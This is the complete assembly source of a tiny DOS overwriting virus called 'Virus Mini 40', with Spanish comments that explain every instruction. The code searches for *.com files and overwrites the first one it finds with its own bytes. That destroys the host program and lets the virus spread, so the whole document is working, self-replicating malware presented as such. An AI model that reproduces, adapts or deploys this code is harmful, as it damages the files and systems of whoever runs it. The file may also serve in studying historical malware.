

; Virus Mini 40. Virus overwriting non resident de 40 bytes

codigo  segment byte public
        assume  cs:codigo, ds:codigo

        org     100h

vmini   proc    far

start:
        mov     ah,4Eh
        mov     dx,offset nombre
        mov     cx,26h
        int     21h       ;  interrupci¢n 21h, funci¢n 4Eh
                          ;  encontrar primer archivo que coincida
                          ;  con string en @ds:dx
                          ;  o sea, buscar el primer *.com del directorio

        jc  short adios   ;  si hay un error, terminar

        mov     ax,3D02h
        mov     dx,9Eh    ;  poner en dx el offset donde qued¢ el
                          ;  nombre del archivo que encontr¢
        int     21h       ;  DOS Services  ah=function 3Dh
                          ;  abrir archivo, al=modo, (02h = read-write)
                          ;  nombre en @ds:dx
                          ;  devuelve el handle en ax

        mov     cl, low offset fin   ; equivale a mov cx, offset fin - 100h
                                     ; pone en cx el tama¤o del virus
        mov     dx,100h
        xchg    ax,bx     ;  pone el handle del archivo en bx
        mov     ah,40h
        int     21h       ;  interrupci¢n 21h, funci¢n 40h
                          ;  escribir un archivo, cx=bytes, desde ds:dx
                          ;  ac  escribe el virus en memoria en el disco

adios:
        mov     ah,4Ch    ; interrupci¢n 21h, funci¢n 4Ch
        int     21h       ; Terminar el programa y cerrar archivos

nombre:        db      '*.com', 0

fin:
vmini   endp

codigo  ends

        end     start

